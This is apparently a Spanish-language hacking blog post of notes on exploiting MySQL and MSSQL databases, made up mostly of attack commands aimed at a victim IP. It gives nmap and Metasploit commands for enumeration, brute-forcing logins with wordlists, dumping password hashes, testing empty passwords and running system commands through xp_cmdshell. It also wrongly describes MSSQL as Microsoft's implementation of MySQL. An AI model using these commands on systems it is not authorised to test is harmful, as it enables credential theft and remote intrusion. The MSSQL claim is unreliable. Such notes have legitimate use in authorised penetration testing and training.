---
title: 'Bases de datos con MySQL'
description: 'Notas sobre cómo explotarlas'
pubDate: 2024-01-02
author: 'Nicolas Riquelme'
tags: ["Hacking", "DB", "BBDD", "shell", "SQL"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# MySQL
MySQL es una solución de base de datos muy popular por su rendimiento, facilidad de uso, bajo costo y compatibilidad con muchos lenguajes y plataformas. Usa el lenguaje SQL (Structured Query Language) para interactuar con las bases de datos. Permite crear bases de datos, tablas, insertar/modificar/eliminar registros, realizar consultas, etc... MySQL suele usar por defecto el puerto TCP 3306.


## Enumeración
### Enumeración básica
```bash
nmap -p3306 -sV {ip víctima}							# para ver sólo la información relativa a las bases de datos con MySQL
```
### Enumeración avanzada
Los siguientes ejemplos extienden el comando "nmap -p3306 -sV {ip víctima}"
```bash
--script=mysql-info		# para ver información detallada sobre el servidor de bases de datos
--script=mysql-users --script-args="mysqluser='{usuario}',mysqlpass='{contraseña}'"	# para ver información detallada sobre el usuario
--script=mysql-databases --script-args="mysqluser='{usuario}',mysqlpass='{contraseña}'"	# para ver información detallada sobre las bases de datos
--script=mysql-variables --script-args="mysqluser='{usuario}',mysqlpass='{contraseña}'"	# para listar las variables de entorno de las bases de datos
--script=mysql-audit --script-args="mysql-audit.mysqluser='{usuario}',mysql-audit.password='{contraseña}',mysql-audit.filename=''192"	# para listar las variables de entorno de las bases de datos


```
## Acceso
```bash
mysql -h {ip víctima} -u {usuario} -p {password} 	# Si no se pone el tag del password saldrá un prompt para facilkitarlo, en caso de que el usuario indicado use contraseña
```
Una vez dentro se ha de tener en cuenta que todos los comandos han de acabar en **;** para que sean ejecutados. Los comandos básicos serían:
```ruby
SHOW DATABASES;													# Muestra las bases de datos existentes
USE {nombre de la base de datos};								# Selecciona la base de datos con la que trabajar
SHOW TABLES;													# Muestra las tablas dentro de la base de datos seleccionada
DESCRIBE {tabla};												# Muestra la estructura de la tabla
SELECT * FROM {tabla};											# Consulta todos los registros de una tabla
INSERT INTO {tabla} VALUES {loquesea};							# Inserta nuevos registros en una tabla
UPDATE {tabla} SET {columna} = {valor} WHERE {condición};		# Actualiza registros existentes que encajen con la condición
DELETE FROM {tabla} WHERE {condición};							# Elimina los registros que cumplan con una condición
CREATE DATABASE {nombre de la nueva base de datos};				# Crea una nueva base de datos
CREATE TABLE {tabla};											# Crea una nueva tabla
ALTER TABLE {tabla} {modificación};								# Modifica la estructura de la tabla
DROP TABLE {tabla};												# Elimina la tabla
SELECT {columna} FROM {tabla} WHERE {condición};				# Consulta
SHOW GRANTS;													# Muestra los permisos del usuario actual
HELP;															# Muestra el manual de ayuda		
```
**NOTA¹**: Existen consultas complejas, con uniones entre tablas/DB/loquesea complejísimas, pero quedan fuera del alcance de este documento.

**NOTA²**: el lenguaje en si **NO ES CASE SENSITIVE** es decir, que los comandos pueden ser escritos en minúsculas y serían reconocidos igualmente, pero para favorecer la lectura humana, se suele haceer así.
### Enumeración avanzada
```bash
# Enumera los directorios en los que el usuario de la base de datos tiene permisos de escritura
use auxiliary/scanner/mysql/mysql_writable_dirs
	set RHOSTS {ip víctima}
	set dir_list /usr/share/wordlists/metasploit/directory.txt
	set verbose false
	set threads 5
	set password ""
	run

# Proporciona hashes de las contraseñas del usuario selecionado
use auxiliary/scanner/mysql/mysql_hashdump
	set RHOSTS {ip víctima}
	set username {usuario o root}
	set password {contraseña o ""}
	set threads 5
	run

nmap -p3306 -sV {ip víctima} --script=mysql-empty-password		# Verifica si permite que algun usuario se pueda loguear sin contraseña

```
## MSSQL
Implementación desarrollada por Microsoft, para la base de datos MySQL. Usa el puerto TCP 1433.

```bash
nmap -p1433 {ip víctima} --script ms-sql-info
nmap -p1433 {ip víctima} --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
nmap -p1433 {ip víctima} --script ms-sql-brute --script-args userdb={diccionario},passdb={diccionario}
nmap -p1433 {ip víctima} --script ms-sql-empty-password
nmap -p1433 {ip víctima} --script ms-sql-query --script-args mssql.username={usuario},mssql.password={contraseña},ms-sql-query.query="{query}" 	# p.e. "SELECT * FROM master..syslogins"
nmap -p1433 {ip víctima} --script ms-sql-dump-hashes --script-args mssql.username={usuario},mssql.password={contraseña)
nmap -p1433 {ip víctima} --script ms-sql-xp-cmdshell --script-args mssql.username={usuario},mssql.password={contraseña),ms-sql-xp-cmdshell.cmd="{comando}"
```

### Metasploit
```ruby
use auxiliary/scanner/mssql/mssql_login
	set RHOSTS {ip víctima}
	set user_file {path a diccionario}
	set pass_file {path a diccionario}
	set threads 5
	run

use auxiliary/admin/mssql/mssql_enum
	set RHOSTS {ip víctima}
	run

use auxiliary/admin/mssql/mssql_enum_sql_logins
	set RHOSTS {ip víctima}
	run

use auxiliary/admin/mssql/mssql_exec
	set RHOSTS {ip víctima}
	set cmd {comando a probar}
	run

use auxiliary/admin/mssql/mssql_enum_domain_accounts
	set RHOSTS {ip víctima}
	run
```
